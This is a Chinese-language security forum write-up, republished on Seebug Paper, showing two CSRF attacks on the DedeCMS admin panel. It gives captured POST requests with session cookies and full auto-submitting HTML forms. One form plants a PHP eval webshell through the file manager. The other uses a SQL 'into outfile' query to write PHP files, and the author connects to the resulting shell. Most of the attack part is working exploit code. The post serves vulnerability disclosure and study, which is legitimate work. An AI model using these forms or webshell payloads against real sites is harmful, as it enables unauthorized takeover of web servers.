来自i春秋作者：[Szdny](http://bbs.ichunqiu.com/thread-11581-1-1.html?from=paper)

#### 00x01

ver.txt版本为 20160816

由于X_Al3r提交过补天，所以最新版本已经不能复现，所以我特地问了他要了前一个版本过来写这篇文章

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/08/074843loybkto8aroatzt0.png)

这里便是Csrf触发点，我们创建文件的时候抓取他的POST包

    
    
    POST /uploads/dede/file_manage_control.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 151
    Cache-Control: max-age=0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Origin: [url]http://127.0.0.1[/url]
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.108 Safari/537.36 2345Explorer/7.2.0.13379
    Content-Type: application/x-www-form-urlencoded
    Referer: [url]http://127.0.0.1/uploads/dede/file_manage_view.php?fmdo=newfile&activepath=%2Fuploads%2Fuploads[/url]
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8
    Cookie: menuitems=1_1%2C2_1%2C3_1; bdshare_firstime=1472114910255; cookiecheckrlddabd86e58aedecd3956d21fa4aaa637=1473291881; PHPSESSID=nn95rbs56hku1pk8jcp5edatv4; ecisp_seccode=ZjppYlTD796UgoNXLcQlNO4UOI2vudHOBktNZoJu5m8%3D; DedeUserID=1; DedeUserID__ckMd5=db571499870b8384; DedeLoginTime=1473291905; DedeLoginTime__ckMd5=6900164b865d5f29; ENV_GOBACK_URL=%2Fuploads%2Fdede%2Fmedia_main.php%3Fdopost%3Dfilemanager
    Connection: close
    
    fmdo=edit&backurl=&activepath=%2Fuploads%2Fuploads&filename=1.php&str=%3C%3Fphp+%40eval%28%24_POST%5B%27x%27%5D%29%3B+%3F%3E&B1=++%E4%BF%9D+%E5%AD%98++

上面为包内容 可以看见，他是由

    
    
    http://127.0.0.1/uploads/dede/file_manage_control.php

进行的操作，那么我们构造表单为 `file_manage_control.php`

触发的from表单开头为

    
    
        <form action="http://127.0.0.1/uploads/dede/file_manage_control.php" method="POST">

method=“POST”意思为Post提交 来看第二句

    
    
    <input type="hidden" name="fmdo" value="edit" />

edit已经表示了为编辑 接着第三句

    
    
    <input type="hidden" name="backurl" value="" />

这句可以不用了解，我们来看第四句

    
    
    <input type="hidden" name="activepath" value="&#47;uploads&#47;uploads" />

这里为保存文件的目录 第五句

    
    
     <input type="hidden" name="filename" value="1&#46;php" />

保存的名字 第六句

    
    
    <input type="hidden" name="str" value="<?php @eval($_POST['x']); ?>" />

这里为文件内容 来看第八句

    
    
    <input type="submit" value="Submit request" />

学过html的人都知道submit为提交，命名为Submit request 那么我们完整的来构造一个表单

    
    
    <!DOCTYPE html>
    <html>
    <head>
    <script>
    function sub(){
    
    document.form1.submit();
    }
    setTimeout(sub,1);
    </script>
    </head>
      <body>
        <form name="form1" action="http://127.0.0.1/uploads/dede/file_manage_control.php" method="POST">
          <input type="hidden" name="fmdo" value="edit" />
          <input type="hidden" name="backurl" value="" />
          <input type="hidden" name="activepath" value="&#47;uploads&#47;uploads" />
          <input type="hidden" name="filename" value="1&#46;php" />
          <input type="hidden" name="str" value="&lt;&#63;php&#32;&#64;eval&#40;&#36;&#95;POST&#91;&apos;x&apos;&#93;&#41;&#59;&#32;&#63;&gt;" />
          <input type="hidden" name="B1" value="&#32;&#32;ä¿&#32;å­˜&#32;&#32;" />
          <input type="submit" value="Submit request" />
        </form>
      </body>
    </html>
    
    
    <script>
    function sub(){
    
    document.form1.submit();
    }
    setTimeout(sub,1);
    </script>

这一段为自动提交命名为from1的表单相当于可以直接点开html进行触发 我们来保存到一个html页面看看效果

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/08/080425a8sin8x4ngppu4n4.png)

发现点开的时候就提示已经保存了一个文件，并且得到了一个越权

#### 0x02Csrf执行sql语句进行getshell

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/08/080752hqsa33h3opsl6635.png)

这里便是第二个触发点 我们看看他的Post包语句

    
    
    select"<?php @eval($_POST['x']); ?>" into outfile "D:/WWW/uploads/3.php" ;

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/08/080919rq3o32836zxvqopv.png)

执行成功，我们来连接一下看看是否可以连接

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/08/081113ti13a3ajrw1c313o.png)

可以进行连接，那么我们来分析一下，先从Post包分析

    
    
    POST /uploads/dede/sys_sql_query.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 163
    Cache-Control: max-age=0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Origin: [url]http://127.0.0.1[/url]
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.108 Safari/537.36 2345Explorer/7.2.0.13379
    Content-Type: application/x-www-form-urlencoded
    Referer: [url]http://127.0.0.1/uploads/dede/sys_sql_query.php[/url]
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8
    Cookie: menuitems=1_1%2C2_1%2C3_1; bdshare_firstime=1472114910255; cookiecheckrlddabd86e58aedecd3956d21fa4aaa637=1473291881; PHPSESSID=nn95rbs56hku1pk8jcp5edatv4; ecisp_seccode=ZjppYlTD796UgoNXLcQlNO4UOI2vudHOBktNZoJu5m8%3D; DedeUserID=1; DedeUserID__ckMd5=db571499870b8384; DedeLoginTime=1473291905; DedeLoginTime__ckMd5=6900164b865d5f29; ENV_GOBACK_URL=%2Fuploads%2Fdede%2Fmedia_main.php%3Fdopost%3Dfilemanager
    Connection: close
    
    dopost=query&querytype=0&sqlquery=select%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22+into+outfile+%22D%3A%2FWWW%2Fuploads%2F3.php%22+%3B&imageField.x=19&imageField.y=13

可以看见，这次是利用

    
    
    sys_sql_query.php

这个文件来进行sql语句 那么我们就可以构造第一句表单

    
    
    form action="http://127.0.0.1/uploads/dede/sys_sql_query.php" method="POST">

还是为post提交 我们来看另外一句关键的

    
    
    <input type="hidden" name="sqlquery" value="select&quot;&lt;&#63;php&#32;phpinfo&#40;&#41;&#59;&#32;&#63;&gt;&quot;&#32;into&#32;outfile&#32;&quot;D&#58;&#47;WWW&#47;uploads&#47;3&#46;php&quot;&#32;&#59;" />

这里便是sql语句的表单（写了一个phpinfo保存为4.php），其他的基本不变，那么我们来构造一个新的from表单

    
    
    <!DOCTYPE html>
    <html>
    <head>
    <script>
    function sub(){
    
    document.form1.submit();
    }
    setTimeout(sub,1);
    </script>
    </head>
      <body>
        <form name = "form1" action="http://127.0.0.1/uploads/dede/sys_sql_query.php" method="POST">
          <input type="hidden" name="dopost" value="query" />
          <input type="hidden" name="querytype" value="0" />
          <input type="hidden" name="sqlquery" value="select&quot;&lt;&#63;php&#32;phpinfo&#40;&#41;&#59;&#32;&#63;&gt;&quot;&#32;into&#32;outfile&#32;&quot;D&#58;&#47;WWW&#47;uploads&#47;4&#46;php&quot;&#32;&#59;" />
          <input type="hidden" name="imageField&#46;x" value="19" />
          <input type="hidden" name="imageField&#46;y" value="13" />
          <input type="submit" value="Submit request" />
        </form>
      </body>
    </html>

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/08/081839qyyicif304qmei75.png)

成功执行，我们来访问一下

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/08/082156gnkmr0y64pr4pmaz.png)

成功执行，并且保存。资料：

[SaFebug](http://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=11291&highlight=Safebug)
[SaFeBuG](http://bbs.ichunqiu.com/thread-10866-1-1.html)

声明： 感谢X_Al3r提供的过程与思路与源码 代替X_Al3r

感谢丁丁提供的思路一，没有思路一也就没有了思路二

本文由i春秋学院提供:http://bbs.ichunqiu.com/thread-11581-1-1.html?from=paper

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/41/>

